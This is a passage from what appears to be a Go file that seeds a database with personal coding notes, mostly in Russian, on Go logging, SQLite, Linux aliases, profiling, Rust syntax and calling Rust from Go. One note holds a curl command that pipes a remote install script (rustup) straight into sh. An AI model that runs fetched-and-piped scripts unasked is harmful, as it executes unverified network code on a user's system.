 loggerWithCore := zap.New(core)\n  loggerWithCore.Info(\"text\", zap.Error(testErr))\n  // in file: {\"level\":\"info\",\"ts\":1618500829.6932197,\"msg\":\"text\",\"error\":\"test\"}\n  loggerWithCoreAndSugar := loggerWithCore.Sugar()\n  loggerWithCoreAndSugar.Infof(\"text: %v\", testErr)\n  // in file: {\"level\":\"info\",\"ts\":1618500829.6932197,\"msg\":\"text: test\"}\n\n  encConsole := zapcore.NewConsoleEncoder(cfg)\n  coreConsole := zapcore.NewCore(encConsole, ws, enab)\n  loggerWithCoreConsole := zap.New(coreConsole)\n  loggerWithCoreConsole.Info(\"text\", zap.Error(testErr))\n  // in file: 1.6185008296932197e+09  info  text  {\"error\": \"test\"}\n  loggerWithCoreConsoleAndSugar := loggerWithCoreConsole.Sugar()\n  loggerWithCoreConsoleAndSugar.Infof(\"text: %v\", testErr)\n  // in file: 1.6185008296932197e+09  info  text: test\n\n  cfgTime := zap.NewProductionEncoderConfig()\n  cfgTime.EncodeTime = zapcore.ISO8601TimeEncoder\n  cfgTime.EncodeLevel = zapcore.CapitalLevelEncoder\n  encConsoleTime := zapcore.NewConsoleEncoder(cfgTime)\n  coreConsoleTime := zapcore.NewCore(encConsoleTime, ws, enab)\n  loggerWithCoreConsoleTime := zap.New(coreConsoleTime)\n  loggerWithCoreConsoleTime.Info(\"text\", zap.Error(testErr))\n  // in file: 2021-04-15T18:39:35.129+0300  INFO  text  {\"error\": \"test\"}\n  loggerWithCoreConsoleTimeAndSugar := loggerWithCoreConsoleTime.Sugar()\n  loggerWithCoreConsoleTimeAndSugar.Infof(\"text: %v\", testErr)\n  // in file: 2021-04-15T18:40:13.211+0300  INFO  text: test\n\n  loggerWithCoreConsoleTimeAndCaller := zap.New(coreConsoleTime, zap.AddCaller())\n  loggerWithCoreConsoleTimeAndCaller.Info(\"text\", zap.Error(testErr))\n  // in file: 2021-04-15T18:41:57.581+0300  INFO  experiment/zaplogger.go:86  text  {\"error\": \"test\"}\n\n  rotateLogger := &lumberjack.Logger{\n    Filename: \"D:\\\\projects\\\\go\\\\experiment\\\\test.log\",\n    MaxSize: 10,  // maximum size in megabytes of the log file before it gets rotated\n    MaxBackups: 5, // maximum number of old log files to retain\n    MaxAge: 30, // maximum number of days to retain old log files\n    Compress: false, // rotated log files should be compressed using gzip\n  }\n  wsRotate := zapcore.AddSync(rotateLogger)\n  coreConsoleTimeRotate := zapcore.NewCore(encConsoleTime, wsRotate, enab)\n  loggerWithCoreConsoleTimeAndCallerRotate := zap.New(coreConsoleTimeRotate, zap.AddCaller())\n  loggerWithCoreConsoleTimeAndCallerRotate.Info(\"text\", zap.Error(testErr))\n  // in file: 2021-04-15T18:53:57.853+0300  INFO  experiment/zaplogger.go:100  text  {\"error\": \"test\"}\n\n  cfgCustom := zap.Config{\n    Encoding: \"json\",\n    Level: zap.NewAtomicLevelAt(zap.DebugLevel),\n    OutputPaths: []string{\"stdout\"},\n    EncoderConfig: zapcore.EncoderConfig{\n      MessageKey: \"message\",\n      LevelKey:    \"level\",\n      EncodeLevel: zapcore.CapitalLevelEncoder,\n      TimeKey:    \"time\",\n      EncodeTime: zapcore.ISO8601TimeEncoder,\n      CallerKey:    \"caller\",\n      EncodeCaller: zapcore.FullCallerEncoder,\n    },\n  }\n  loggerCfgCustom, _ := cfgCustom.Build()\n  loggerCfgCustom.Info(\"custom\")\n  // {\"level\":\"INFO\",\"time\":\"2021-04-15T21:29:12.729+0300\",\"caller\":\"_/D_/projects/go/experiment/zaplogger.go:118\",\"message\":\"custom\"}\n\n  wsFileAndConsole := zapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), wsRotate)\n  coreFileAndConsole := zapcore.NewCore(encConsoleTime, wsFileAndConsole, enab)\n  loggerWithCoreFileAndConsole := zap.New(coreFileAndConsole, zap.AddCaller())\n  loggerWithCoreFileAndConsole.Info(\"file and console\")\n  // in file: 2021-04-15T21:29:12.729+0300  INFO  experiment/zaplogger.go:123  file and console\n  // 2021-04-15T21:29:12.729+0300  INFO  experiment/zaplogger.go:123  file and console\n\n  zap.ReplaceGlobals(loggerWithCoreFileAndConsole) // теперь можно вызывать из любого места zap.L()\n  fZap()\n}\n\nfunc fZap() {\n  zap.L().Error(\"global\", zap.Error(testErr))\n  // in file: 2021-04-15T21:29:12.729+0300  ERROR  experiment/zaplogger.go:130  global  {\"error\": \"test\"}\n  // 2021-04-15T21:29:12.729+0300  ERROR  experiment/zaplogger.go:130  global  {\"error\": \"test\"}\n}")
	create(db, "Linux uniq\n(tags: linux uniq)\n---\n\ncat file.txt | uniq -d \n-u (--unique) — выводит исключительно те строки, у которых нет повторов\n-d (--repeated) — если какая-либо строка повторяется несколько раз, она будет выведена лишь единожды.\n-D — выводит только повторяющиеся строки.")
	create(db, "Update golang version on linux\n(tags: update golang version linux)\n---\n\ncd /home/dim\nwget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz\nrm -rf /usr/local/go\ntar -C /usr/local -xzf /home/dim/go1.16.3.linux-amd64.tar.gz\necho $PATH | grep \"/usr/local/go/bin\"\n// если нет, то\n// export PATH=$PATH:/usr/local/go/bin\n// source .bashrc\nВ GoLand: File -> Invalidate Caches")
	create(db, "Golang embed template\n(tags: golang embed template)\n---\n\nhttps://github.com/philippta/web-frontend-demo\n\n// main.go\npackage main\n\nimport (\n  \"net/http\"\n  \"stepik/html\"\n)\n\nfunc main() {\n  http.HandleFunc(\"/dashboard\", dashboard)\n  http.HandleFunc(\"/profile/show\", profileShow)\n  http.ListenAndServe(\":8080\", nil)\n}\nfunc dashboard(w http.ResponseWriter, r *http.Request) {\n  p := html.DashboardParams{\n    Title:   \"Dashboard\",\n    Message: \"Hello from dashboard\",\n  }\n  html.Dashboard(w, p)\n}\nfunc profileShow(w http.ResponseWriter, r *http.Request) {\n  p := html.ProfileShowParams{\n    Title:   \"Profile Show\",\n    Message: \"Hello from profile show\",\n  }\n  html.ProfileShow(w, p)\n}\n\n// html/html.go\npackage html\n\nimport (\n  \"embed\"\n  \"io\"\n  \"text/template\"\n)\n\n//go:embed *\nvar files embed.FS\nvar (\n  dashboard   = parse(\"dashboard.html\")\n  profileShow = parse(\"profile/show.html\")\n)\ntype DashboardParams struct {\n  Title   string\n  Message string\n}\nfunc Dashboard(w io.Writer, p DashboardParams) error {\n  return dashboard.Execute(w, p)\n}\ntype ProfileShowParams struct {\n  Title   string\n  Message string\n}\nfunc ProfileShow(w io.Writer, p ProfileShowParams) error {\n  return profileShow.Execute(w, p)\n}\nfunc parse(file string) *template.Template {\n  return template.Must(\n    template.New(\"layout.html\").ParseFS(files, \"layout.html\", file))\n}\n\n// html/layout.html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>{{.Title}}</title>\n  </head>\n  <body>\n    {{block \"content\" .}}{{end}}\n  </body>\n</html>\n\n// html.dashboard.html\n{{define \"content\"}}\n<p>\n  Dashboard:\n  {{.Message}}\n</p>\n{{end}}\n\n//html/profile/show.html\n{{define \"content\"}}\n<p>\n  Profile Show:\n  {{.Message}}\n</p>\n{{end}}")
	create(db, "Sqlite date\n(tags: sqlite date)\n---\n\nhttps://codernotes.ru/articles/bazy-dannyh-t-sql/funkcii-daty-i-vremeni-v-sqlite.html\n\n-- Определить текущую дату.\nSELECT date('now');\n-- Вычислить последний день текущего месяца.\nSELECT date('now','start of month','+1 month','-1 day');\n-- Вычислить дату и время имея на входе метку времени unix 1092941466.\nSELECT datetime(1092941466, 'unixepoch');\n-- Вычислить дату и время имея на входе метку времени unix 1092941466, и перевести его в локальное время.\nSELECT datetime(1092941466, 'unixepoch', 'localtime');\n-- Получить текущую unix метку времени.\nSELECT strftime('%s','now');\n-- Вычислить количество дней с момента подписания Декларации Независимости США.\nSELECT julianday('now') - julianday('1776-07-04');\n-- Вычислить количество секунд с определенного момента в 2004 году:\nSELECT strftime('%s','now') - strftime('%s','2004-01-01 02:34:56');\n-- Вычислить дату первого вторника октября текущего года.\nSELECT date('now','start of year','+9 months','weekday 2');\n-- Вычислить время с эпохи unix в секундах (аналогично strftime('%s','now') не считая дробной части):\nSELECT (julianday('now') - 2440587.5)*86400.0;\n\ndate(timestring, modifier, modifier, ...)\ntime(timestring, modifier, modifier, ...)\ndatetime(timestring, modifier, modifier, ...)\njulianday(timestring, modifier, modifier, ...)\nstrftime(format, timestring, modifier, modifier, ...)\n-- format:\n%d  День месяца: 00\n%f  Доли секунды: SS.SSS\n%H  час: 00-24\n%j  день года: 001-366\n%J  Юлианский день\n%m  месяц: 01-12\n%M  минуты: 00-59\n%s  количество секунд с 1970-01-01 (unix timestamp)\n%S  секунды: 00-59\n%w  день недели 0-6 где Воскресенье==0\n%W  неделя года: 00-53\n%Y  год: 0000-9999\n%%  %\n\ndate(...) = strftime('%Y-%m-%d', ...)\ntime(...) = strftime('%H:%M:%S', ...)\ndatetime(...) = strftime('%Y-%m-%d %H:%M:%S', ...)\njulianday(...) = strftime('%J', ...)\n\n-- in table must be:\nYYYY-MM-DD\nYYYY-MM-DD HH:MM\nYYYY-MM-DD HH:MM:SS\nYYYY-MM-DD HH:MM:SS.SSS\nYYYY-MM-DDTHH:MM\nYYYY-MM-DDTHH:MM:SS\nYYYY-MM-DDTHH:MM:SS.SSS\nHH:MM\nHH:MM:SS\nHH:MM:SS.SSS\nnow\nDDDDDDDDDD\n\n-- modifier:\nNNN days\nNNN hours\nNNN minutes\nNNN.NNNN seconds\nNNN months\nNNN years\nstart of month\nstart of year\nstart of day\nweekday N\nunixepoch\nlocaltime\nutc")
	create(db, "Sqlite foreigen keys\n(tags: sqlite foreigen key)\n---\n\nPRAGMA foreign_keys=on;\n\nCREATE TABLE books(\n  Id INTEGER PRIMARY KEY,\n  title TEXT NOT NULL,\n  count_page INTEGER NOT NULL CHECK (count_page >0),\n  price REAL CHECK (price >0)\n);\n\nCREATE TABLE auth(\n  id INTEGER PRIMARY KEY,\n  name TEXT NOT NULL,\n  age INTEGER  CHECK (age >16)\n);\n\nCREATE TABLE auth_book (\n  auth_id INTEGER NOT NULL,\n  books_id INTEGER NOT NULL,\n  FOREIGN KEY (auth_id) REFERENCES auth(id)\n  FOREIGN KEY (books_id) REFERENCES books(id)\n);")
	create(db, "Golang init\n(tags: redis syntax)\n---\n\nmain\nimport pkg1\n  pkg1\n  import pkg2\n    pkg2\n    const\n    var\n    init()\n  const\n  var\n  init()\nconst\nvar\ninit()\nmain()")
	create(db, "DeepEqual vs google cmp\n(tags: deepequal vs cmp compare)\n---\n\nhttps://dev.to/mariocarrion/go-package-for-equality-github-com-google-go-cmp-f8i\n\npackage main\n\nimport (\n  \"fmt\"\n  \"github.com/google/go-cmp/cmp\"\n  \"github.com/google/go-cmp/cmp/cmpopts\"\n  \"reflect\"\n  \"strings\"\n)\n\nfunc main() {\n  a := []int{1,2,3}\n  b := []int{1,3,2}\n  fmt.Println(reflect.DeepEqual(a, b)) // false\n  fmt.Println(cmp.Equal(a, b)) // false\n  opt := cmpopts.SortSlices(func(a, b int) bool {\n    return a < b\n  })\n  fmt.Println(cmp.Equal(a, b, opt)) // true\n\n  c := map[int]string{1: \"aa\", 2: \"bb\", 3: \"cc\"}\n  d := map[int]string{1: \"aa\", 3: \"cc\", 2: \"bb\"}\n  fmt.Println(reflect.DeepEqual(c, d)) // true\n  fmt.Println(cmp.Equal(c, d)) // true\n  opt2 := cmpopts.SortMaps(func(c, d int) bool {\n    return c < d\n  })\n  fmt.Println(cmp.Equal(c, d, opt2)) // true\n\n  e := map[int]Message{1: \"aa\", 2: \"bb\", 3: \"cc\"}\n  f := map[int]Message{1: \"aa\", 3: \"cc\", 2: \"BB\"}\n  fmt.Println(reflect.DeepEqual(e, f)) // false\n  fmt.Println(cmp.Equal(e, f)) // true\n\n  g := Alert{Message: \"aa\", code: 1}\n  h := Alert{Message: \"aa\", code: 2}\n  fmt.Println(reflect.DeepEqual(g, h)) // false\n  //fmt.Println(cmp.Equal(g, h)) // panic\n  fmt.Println(cmp.Equal(g, h, cmpopts.IgnoreUnexported(Alert{}))) // true\n\n  g1 := &Alert{Message: \"aa\", code: 1}\n  h1 := &Alert{Message: \"aa\", code: 2}\n  fmt.Println(reflect.DeepEqual(g1, h1)) // false\n  //fmt.Println(cmp.Equal(g1, h1)) // panic\n  fmt.Println(cmp.Equal(g1, h1, cmpopts.IgnoreUnexported(Alert{}))) // true\n}\n\ntype Message string\n\nfunc (m Message) Equal(b Message) bool {\n  return strings.ToLower(string(m)) == strings.ToLower(string(b))\n}\n\ntype Alert struct {\n  Message Message\n  code    int\n}")
	create(db, "Sqlboiler\n(tags: sqlboiler)\n---\n\nhttps://github.com/volatiletech/sqlboiler\n\n// for go 1.15 (for above use go install)\nGO111MODULE=on go get -u -t github.com/volatiletech/sqlboiler/v4\nGO111MODULE=on go get github.com/volatiletech/sqlboiler/v4/drivers/sqlboiler-psql\ngo get github.com/volatiletech/sqlboiler/v4\ngo get github.com/volatiletech/null/v8\n// in sqlboiler.toml file:\noutput   = \"my_models\"\nwipe     = true\nno-tests = true\n\n[psql]\n  dbname = \"dbname\"\n  host   = \"localhost\"\n  port   = 5432\n  user   = \"dbusername\"\n  pass   = \"dbpassword\"\n  schema = \"myschema\"\n  blacklist = [\"migrations\", \"other\"]\n// wipe - remove \"my_models\" folder\n// in terminal:\nsqlboiler psql\n// check \"my_models\" folder (\"models\" on default) in your project\n\n// print query\nctx = boil.WithDebug(ctx, true)")
	create(db, "Golang pprof\n(tags: golang pprof)\n---\n\npackage main\n\nimport (\n  \"fmt\"\n  \"io\"\n  \"net/http\"\n  _ \"net/http/pprof\"\n  \"time\"\n)\n\nfunc main() {\n  Handler := func(w http.ResponseWriter, req *http.Request){\n    sleep(5)\n    sleep(10)\n    io.WriteString(w, \"for test\")\n  }\n  http.HandleFunc(\"/\", Handler)\n  http.ListenAndServe(\":1234\", nil)\n}\n\nfunc sleep(sleepTime int) {\n  time.Sleep(time.Duration(sleepTime) * time.Millisecond)\n  fmt.Println(\"slept for\", sleepTime, \"ms\")\n}\n\n// start Apache Bensh for generate testing requests\n// 5000 numbers on 10 threads\nab -n 5000 -c 10 http://localhost:1234/\n// get snap of profile\ncurl -s \"localhost:1234/debug/pprof/profile?seconds=10\" > out.dump\ngo tool pprof out.dump\nweb\n// on error: Running Firefox as root in a regular user's session is not supported\n// exit\n// su - username\n// go tool pprof out.dump\n// on error: no DISPLAY environment variable specified\n// exit\n// export DISPLAY=:0\n// go tool pprof out.dump\nweb sleep")
	create(db, "Golang benchmark \n(tags: golang benchmark)\n---\n\n// main.go\npackage main\n\nimport \"time\"\n\nfunc main() {\n\n}\nfunc sleep1(sleepTime int) {\n  time.Sleep(time.Duration(sleepTime) * time.Millisecond)\n}\nfunc sleep2(sleepTime int) {\n  <-time.After(time.Duration(sleepTime) * time.Millisecond)\n}\n\n// main_test.go\npackage main\n\nimport \"testing\"\n\nfunc Benchmark_sleep1(b *testing.B) {\n  for i := 0; i < b.N; i++ {\n    sleep1(10)\n  }\n}\nfunc Benchmark_sleep2(b *testing.B) {\n  for i := 0; i < b.N; i++ {\n    sleep2(10)\n  }\n}\n\ngo test -bench=. -benchmem -cpuprofile=cpu.out -memprofile=mem.out\n//Benchmark_sleep1-4  100  11703997 ns/op  166 B/op  0 allocs/op\n//Benchmark_sleep2-4  100  11401463 ns/op  200 B/op  3 allocs/op\ngo tool pprof cpu.out\nweb \n// see pprof tag\n\ngo test -bench=Benchmark_sleep1 -benchmem -cpuprofile=sleep1_cpu.out -memprofile=sleep1_mem.out\ngo test -bench=Benchmark_sleep2 -benchmem -cpuprofile=sleep2_cpu.out -memprofile=sleep2_mem.out\ngo tool pprof -base sleep1_cpu.out sleep2_cpu.out\ntop10 -cum\n// if \"cum -20ms\" then sleep2 better than sleep1\ngo tool pprof -base sleep1_mem.out sleep2_mem.out\ntop10 -cum\n// if \"cum 1696.33kB\" then sleep2 worse than sleep1 ")
	create(db, "Golang project structure\n(tags: golang project structure)\n---\n\nmyapp\n  cmd // для сборки различных приложений с той же кодовой базой\n  firstapp\n    main.go\n  secondapp\n    main.go\n  internal // бизнеслогика данного проекта, не экспортируется в другие проекты\n  pkg // методы с открытым апи, можно экспортировать в другие проекты\n  deployments // docker-compose для инфраструктуры\n  scripts // различные скрипты\n  tools // инструменты или мини-программы использующие данную кодовую базу\n  infrastructure // все что касается взаимодействия с инфраструктурой\n  init // содержит начальные конфигурации\n  transport // все что касается транспорта grps, http и др\n  domain // здесь описаны доменные сущности\n  config // структура конфигурации приложения\n  endpoint // содержит endpoint, response, request, middleware для go-kit\n  plugins // скомпилированные .so плагины (код их в internal)")
	create(db, "Linux alias\n(tags: linux alias)\n---\n\nalias # список алиасов\nalias c='clear' # очистить вывод терминала\nunalias c # удалить алиас\n# можно добавить в ~/.bashrc чтоб каждый раз не создавать\n\nalias ll='ls -la'\nalias cd..='cd ..'\nalias ..='cd ..'\nalias ...='cd ../../../'\nalias ....='cd ../../../../'\nalias .....='cd ../../../../'\nalias mkdir='mkdir -pv' # Создавать дерево каталогов, если оно не существует\nalias diff='colordiff' # Делаем вывод diff цветным\nalias h='history'\nalias j='jobs -l'\nalias path='echo -e ${PATH//:/\\\\n}'\nalias now='date +\"%T\"'\nalias nowtime=now\nalias nowdate='date +\"%d-%m-%Y\"'\nalias ping='ping -c 5'\nalias ports='netstat -tulanp' # Открытые порты\nalias iptlist='sudo /sbin/iptables -L -n -v --line-numbers'\nalias iptlistin='sudo /sbin/iptables -L INPUT -n -v --line-numbers'\nalias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'\nalias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'\nalias firewall=iptlist\nalias meminfo='free -m -l -t' # Использование памяти\nalias psmem='ps auxf | sort -nr -k 4' # Показать процессы потребляющие больше всего памяти\nalias psmem10='ps auxf | sort -nr -k 4 | head -10'\nalias pscpu='ps auxf | sort -nr -k 3' # Показать процессы использующие процессор\nalias pscpu10='ps auxf | sort -nr -k 3 | head -10'\nalias cpuinfo='lscpu' # Информация о процессоре\nalias gpumeminfo='grep -i --color memory /var/log/Xorg.0.log' # Посмотреть память видеокарты")
	create(db, "Blockchain\n(tags: blockchain)\n---\n\nhttps://github.com/tensor-programming/golang-blockchain\n\npackage main\n\nimport (\n  \"bytes\"\n  \"crypto/sha256\"\n  \"fmt\"\n)\n\ntype BlockChain struct {\n  blocks []*Block\n}\ntype Block struct {\n  Hash     []byte\n  Data     []byte\n  PrevHash []byte\n}\nfunc (b *Block) DeriveHash() {\n  info := bytes.Join([][]byte{b.Data, b.PrevHash}, []byte{})\n  hash := sha256.Sum256(info)\n  b.Hash = hash[:]\n}\nfunc CreateBlock(data string, prevHash []byte) *Block {\n  block := &Block{[]byte{}, []byte(data), prevHash}\n  block.DeriveHash()\n  return block\n}\nfunc (chain *BlockChain) AddBlock(data string) {\n  prevBlock := chain.blocks[len(chain.blocks)-1]\n  new := CreateBlock(data, prevBlock.Hash)\n  chain.blocks = append(chain.blocks, new)\n}\nfunc Genesis() *Block {\n  return CreateBlock(\"Genesis\", []byte{})\n}\nfunc InitBlockChain() *BlockChain {\n  return &BlockChain{[]*Block{Genesis()}}\n}\n\nfunc main() {\n  chain := InitBlockChain()\n\n  chain.AddBlock(\"First Block after Genesis\")\n  chain.AddBlock(\"Second Block after Genesis\")\n  chain.AddBlock(\"Third Block after Genesis\")\n\n  for _, block := range chain.blocks {\n    fmt.Printf(\"Previous Hash: %x\\n\", block.PrevHash)\n    fmt.Printf(\"Data in Block: %s\\n\", block.Data)\n    fmt.Printf(\"Hash: %x\\n\", block.Hash)\n  }\n}")
	create(db, "Turn off gc\n(tags: off cg golang)\n---\n\nfunc f() {\n  defer debug.SetGCPercent(debug.SetGCPercent(-1))\n  // do something\n}")
	create(db, "Call rust from golang\n(tags: call rust golang)\n---\n\nhttps://github.com/mediremi/rust-plus-golang\n\n// curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n// export PATH=$PATH:/root/.cargo/bin\n// cd ~\n// source .bashrc\n\n// main.go\npackage main\n\n/*\n#cgo LDFLAGS: -L./lib -lhello\n#include \"./lib/hello.h\"\n*/\nimport \"C\"\n\nfunc main() {\n  C.hello(C.CString(\"John Smith\"))\n}\n\n// lib/hello.h\nvoid hello(char *name);\n\n// lib/hello/Cargo.toml\n[package]\nname = \"hello\"\nversion = \"0.1.0\"\n\n[lib]\ncrate-type = [\"cdylib\"]\n\n[dependencies]\nlibc = \"0.2.2\"\n\n// lib/hello/src/lib.rs\nextern crate libc;\nuse std::ffi::CStr;\n\n#[no_mangle]\npub extern \"C\" fn hello(name: *const libc::c_char) {\n    let buf_name = unsafe { CStr::from_ptr(name).to_bytes() };\n    let str_name = String::from_utf8(buf_name.to_vec()).unwrap();\n    println!(\"Hello {}!\", str_name);\n}\n\n// Makefile\nROOT_DIR := $(dir $(realpath $(lastword $(MAKEFILE_LIST))))\n\nbuild:\n  cd lib/hello && cargo build --release\n  cp lib/hello/target/release/libhello.so lib/\n  go build -ldflags=\"-r $(ROOT_DIR)lib\" main.go\n\nrun: build\n  ./main\n  \n// make\n// ./main")
	create(db, "Rust syntax\n(tags: rust syntax)\n---\n\nhttps://metanit.com/rust/tutorial\n\nuse std::collections::HashMap;\nuse my_module::inner_module::test;\n\nconst TEXT: &str = \"constanta\";\n// let b: &str = \"not compiled\";\n\nfn main() {\n  // let if\n  let condition = true;\n  let number = if condition { 4 } else { 5 };\n  println!(\"number = {}\", number);  // number = 4\n  \n  // match\n  let num = 3;\n  let result = match num {\n    1 => \"один\",\n    2 => \"два\",\n    3 => \"три\",\n    _ => \"непонятно\"\n  };\n  println!(\"result = {}\", result);  // result = три\n  \n  // loop\n  let mut n = 1;\n  let result = loop {\n    n = n + 1;\n    if n == 10 {\n      break n;\n    }\n  };\n  println!(\"result = {}\", result);  // result = 10\n  // while\n  let mut n = 1;\n  while n < 10 {\n    n = n + 1;\n  }\n  println!(\"n = {}\", n);  // n = 10\n  // for\n  for num in 1..6 {\n    println!(\"num = {}\", num);\n  }\n  \n  // function\n  hello(); // Hello Rust\n  println!(\"sum = {}\", sum(2, 3)); // sum = 5\n  \n  // constant\n  const PI: f32 = 3.14; // can not be changed\n  println!(\"PI = {}\", PI);\n  \n  // anonymous function\n  let sum = |a: i32, b: i32| -> i32{\n    a + b\n  };\n  let sum_of_5_and_4 = sum(5, 4);\n  println!(\"Сумма 5 и 4 равна: {}\", sum_of_5_and_4); //Сумма 5 и 4 равна: 9\n  let sum = |a, b| a + b; //without types\n  let sum_of_int = sum(5, 4);\n  // let sum_of_float = sum(5.3, 4.2); //error: expected integer, found floating-point number\n  \n  // closure\n  let message = \"Hello Rust!\";\n  let hello = || {\n    println!(\"{}\", message); // using environment variable\n  };\n  hello(); // Hello Rust!\n  \n  // tuple\n  let user = (\"Tom\", 36, 1.78);\n  let user: (&str, u8, f32) = (\"Tom\", 36, 1.78);\n  println!(\"Имя: {}\", user.0); // Имя: Tom\n  // mutable tuple\n  let mut user = (\"Tom\", 32, 1.65);\n  user.0 = \"Bob\";\n  println!(\"Имя: {}\", user.0); // Имя: Bob\n  // decomposition of tuple\n  let (name, _, height) = user;\n  println!(\"Имя: {}\", name); // Имя: Bob\n  \n  // array\n  let numbers: [i32; 7] = [1, 2, 3, 5, 8, 13, 21];\n  let numbers = [1, 2, 3, 5, 8, 13, 21];\n  println!(\"{}\", numbers[0]);   // 1\n  // mutable array\n  let mut users = [\"Tom\", \"Bob\", \"Sam\"];\n  users[0] = \"Alice\";\n  println!(\"{}\", users[0]);   // Alice\n  // iterate array\n  for user in users.iter() {\n    print!(\"{} \", user);\n  }\n  // array with default\n  let numbers: [i32; 5] = [2; 5]; // 2 2 2 2 2\n  \n  // struct\n  let tom = Person {\n    name: \"Tom\".to_string(),\n    age: 36,\n    height: 1.78,\n  };\n  println!(\"name = {}\", tom.name); // name = Tom\n  let bob = Person {\n    name: \"Bob\".to_string(),\n    ..tom\n  };\n  println!(\"name = {}\", bob.name); // name = Bob\n  // decomposition of struct\n  let Person { name: username, age: userage, height: _ } = tom;\n  println!(\"name = {}  age = {}\", username, userage); // name = Tom  age = 36\n  \n  // tuple structs\n  let start = Point(2, 4);\n  println!(\"Начало: (x={}, y={})\", start.0, start.1); // Начало: (x=2, y=4)\n  let end = Point(2, 7);\n  let dist = Distance(start, end);\n  println!(\"Начало: ({},{})\", dist.0.0, dist.0.1); // Начало: (2,4)\n  \n  // enums\n  let op = OperationType::Subtract;\n  match op {\n    OperationType::Add => println!(\"Сложение\"),\n    OperationType::Subtract => println!(\"Вычитание\"),\n  }\n  \n  // enums with types\n  let dt = DayTime::Morning(\"Доброе утро\".to_string());\n  match dt {\n    DayTime::Morning(_) => println!(\"Добрый день!\"),\n    DayTime::Evening(message) => println!(\"{}\", message),\n  }\n  \n  // range\n  let numbers = 1..9;\n  for num in numbers {\n    print!(\"{} \", num); // 1 2 3 4 5 6 7 8\n  }\n  let numbers = std::ops::Range { start: 1, end: 9 };\n  for num in numbers {\n    print!(\"{} \", num);     // 1 2 3 4 5 6 7 8\n  }\n  let numbers = 1..=9;    // include 9\n  for num in numbers {\n    print!(\"{} \", num);     // 1 2 3 4 5 6 7 8 9\n  }\n  let numbers = [1, 2, 3, 4, 5, 6, 7, 8];\n  for num in numbers[1..5].iter() {\n    print!(\"{} \", num)              // 2 3 4 5\n  }\n  \n  // if let\n  let user = (\"Tom\", 21);\n  if let (\"Tom\", age) = user {\n    println!(\"age: {}\", age); // 21\n  }\n  let morning = DayTime::Morning(\"Доброе утро\".to_string());\n  if let DayTime::Morning(message) = morning {\n    println!(\"morning message: {}\", message); // morning message: Доброе утро\n  }\n  let tom = Person {\n    name: \"Tom\".to_string(),\n    age: 33,\n    height: 1.70,\n  };\n  let username = \"Tom\".to_string();\n  if let Person { name: username, age: 33, height: _ } = tom {\n    println!(\"Это Том\");\n  }\n  \n  // ownership\n  let s1 = \"hello\".to_string();  // s1 - владелец строки \"hello\"\n  println!(\"s1: {}\", s1);\n  let s2 = s1;  // меняем владельца строки на s2\n  // println!(\"s1: {}\", s1);  // !Ошибка - s1 теперь нельзя использовать\n  \n  let s1 = \"hello\".to_string();  // s1 - владелец строки \"hello\"\n  println!(\"s1: {}\", s1);\n  display_message(s1);\n  // println!(\"s1: {}\", s1);  // !Ошибка - переменная s1 неинициализирована\n  \n  // reference\n  let s1 = \"hello\".to_string();  // s1 - владелец строки \"hello\"\n  let s2 = &s1;  // s2 получает ссылку на значение переменной s1\n  println!(\"s1: {}\", s1);  // s1: hello\n  display_message_ref(&s1);\n  \n  // mutable reference\n  let mut message = \"hello\".to_string();\n  change_message(&mut message);\n  let mut s1 = \"hello\".to_string();\n  // let s2 = &mut s1;\n  // let s3 = &mut s1; // error: second mutable borrow occurs here (только одна мутабельная ссылка может быть)\n  {\n    let s3 = &mut s1;\n  }\n  let s2 = &mut s1;\n  s2.push('!');\n  println!(\"{}\", s1); // hello!\n  \n  let mut s1 = \"hello\".to_string();\n  // let s2 = &mut s1;    // если определить здесь, будет ошибка\n  {\n    let s3 = &mut s1;\n    s3.push('?');\n  }\n  let s2 = &mut s1;\n  s2.push('!');\n  println!(\"{}\", s1); // hello?!\n  \n  // slice\n  let numbers = [1, 2, 3, 4, 5, 6, 7, 8];\n  let slice = &numbers[1..5];  // получим слайс\n  println!(\"slice[0]={}\", slice[0]);  // выведем первый элемент слайса\n  for num in slice {\n    print!(\"{} \", num)  // 2 3 4 5\n  }\n  // numbers[..] эквивалентно [1, 2, 3, 4, 5, 6, 7, 8]\n  // numbers[..3] эквивалентно [1, 2, 3 ]\n  // numbers[..=3] эквивалентно [1, 2, 3, 4]\n  // numbers[1..] эквивалентно [2, 3, 4, 5, 6, 7, 8]\n  // numbers[1..3] эквивалентно [2, 3]\n  // numbers[1..=3] эквивалентно [2, 3, 4]\n  let mut numbers = [1, 2, 3, 4, 5, 6, 7, 8];\n  let slice = &mut numbers[1..5]; // получим слайс\n  slice[0] = 81; // изменим первый элемент слайса\n  println!(\"slice[0]={}\", slice[0]); // slice[0]=81\n  \n  // method\n  let tom = Person {\n    name: \"Tom\".to_string(),\n    age: 36,\n    height: 156.0,\n  };\n  tom.display(); // Name: Tom  Age: 36\n  tom.is_older(&bob);\n  let mut tom = Person { name: \"Tom\".to_string(), age: 36, height: 156.0 };\n  tom.change_age(42);\n  tom.display(); // Name: Tom  Age: 42\n  \n  // associated function\n  let tom = Person::create(\"Tom\", 36);\n  tom.display(); // Name: Tom  Age: 36\n  \n  // trait\n  tom.print(); // Person Tom; age: 36\n  println!(\"{}\", tom.preview()); // [Предпросмотр] Person Tom; age: 36\n  tom.print_something(); // something...\n  display_printable(&tom); // Person Tom; age: 36\n  let printable = create_printable();\n  display_printable(&printable); // Person Bob; age: 23\n  \n  // generics\n  let bob = PersonGen { id: String::from(\"fhe34u847\"), name: \"Bob\".to_string(), place: 3 };\n  println!(\"id: {}  name: {}\", bob.id, bob.name); // id: fhe34u847  name: Bob\n  let morning = DayTimeGen::Morning(\"Доброе утро\".to_string());\n  let evening = DayTimeGen::Evening(16);\n  let result1 = receive(3);\n  println!(\"{}\", result1);  // 3\n  let result2 = receive(\"hello\");\n  println!(\"{}\", result2);  // hello\n  println!(\"{}\", bob.get_id());  // fhe34u847\n  let rob = PersonGen { id: 2, name: \"Rob\".to_string(), place: 4 };\n  println!(\"{}\", rob.get_id_i32()); //2\n  let tom = Person { name: \"Tom\".to_string(), age: 36, height: 156.0 };\n  display_printable_gen(&tom); // Person Tom; age: 36\n  display_printable_gen_where(&tom); // Person Tom; age: 36\n  print_send(&tom); //Person Tom; age: 36 Сообщение отправлено\n  \n  // 